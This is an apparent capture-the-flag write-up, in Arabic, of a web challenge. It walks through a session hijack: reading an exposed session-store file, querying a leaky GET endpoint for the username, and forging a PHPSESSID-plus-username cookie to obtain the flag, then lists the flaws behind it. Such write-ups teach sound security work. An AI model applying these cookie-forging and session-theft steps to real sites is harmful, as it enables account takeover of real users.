
# الفكرة العامة للتحدّي

الموقع يعطي **الفلاغ فقط للمستخدمين الـ Logged-in**.

لكن لا يوجد فورم Login.  
كل شيء مبني على **Sessions** مخزّنة في ملف على السيرفر.

الهدف:  
تزور ملف الـ sessions → تحصل على Session ID صالح → تعمل نفسك مستخدم حقيقي → الموقع يعطيك الفلاغ.

---

# الشرح خطوة بخطوة

## 1) قراءة كود الجافاسكربت

الموقع فيه سكريبت:

```javascript
if(document.cookie !== ''){
  $.post('getcurrentuserinfo.php',{
    'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
  },function(data){
    cu = data;
  });
}
```

الكود يعمل الآتي:

1. يأخذ الـ **PHPSESSID** من الـ Cookie.
    
2. يرسل POST إلى `getcurrentuserinfo.php` ليجلب بيانات المستخدم بناءً على الـ session id.
    

معنى هذا:  
الموقع يصدّق أي Session ID أنت تكتبه في الـ Cookie طالما موجود في ملف الـ sessions.

---

## 2) التجربة باستخدام Burp Suite

ترسل Request بدون كوكي → الموقع يقول:

```
Session not found in data/session_store.txt
```

يعني أن الموقع يبحث داخل ملف:

```
data/session_store.txt
```

ويبحث عن Session IDs صحيحة.

---

## 3) الوصول لملف sessions

ملف الـ sessions يمكن الوصول له (misconfiguration).

تفتحه فتجد بداخله قائمة الـ Session IDs الحقيقية.

مثال:

```
iuqwhe23eh23kej2hd2u3h2k23
abc123xyz098
...
```

هذه الـ IDs صالحة وصادرة من السيرفر.

---

## 4) استخدام Session ID صالحة

ترسل Request في Burp:

```
Cookie: PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23
```

الرد:

```
UserInfo Cookie don't have the username , Validation failed
```

يعني:  
الكوكي لازم يحتوي **username** أيضاً وليس فقط session id.

---

## 5) معرفة الـ username الحقيقي

يوجد ملف آخر أو سكريبت آخر اسمه:

```
getcurrentuseringo.php
```

(لاحظ أنه اسمه مختلف: "ingo" وليس "info")

هذا السكريبت يعمل GET وليس POST.

فتعمل طلب:

```
GET /restricted-sessions/getcurrentuseringo.php?PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23
```

الرد:

```json
{
 "name":"john",
 "email":"john@example.com",
 "session_id":"iuqwhe23eh23kej2hd2u3h2k23"
}
```

الآن عرفت:

- الـ session id = هذا الذي استخدمته
    
- username الحقيقي = **john**
    

---

## 6) عمل Cookie كامل

ترجع للصفحة الرئيسية وترسل:

```
Cookie: PHPSESSID=iuqwhe23eh23kej2hd2u3h2k23; username=john
```

الموقع الآن يعتقد أنك "john" logged-in.

---

## 7) الموقع يعطيك الفلاغ

بمجرد أن يراك مستخدم مصادق عليه Logged-in يعرض لك الفلاغ:

```
sessionareawesomebutifitsecure
```

---

# لماذا التحدّي سهل اختراقه؟

1. ملف session_store.txt مكشوف على الويب.
    
2. الـ username يتم التحكّم به من الـ Cookie.
    
3. لا يوجد أي hashing أو validation حقيقي.
    
4. يوجد سكريبت يكشف معلومات المستخدم عبر GET لأي شخص.
    

كل هذا = Broken Authentication + Insecure Direct Object Access.
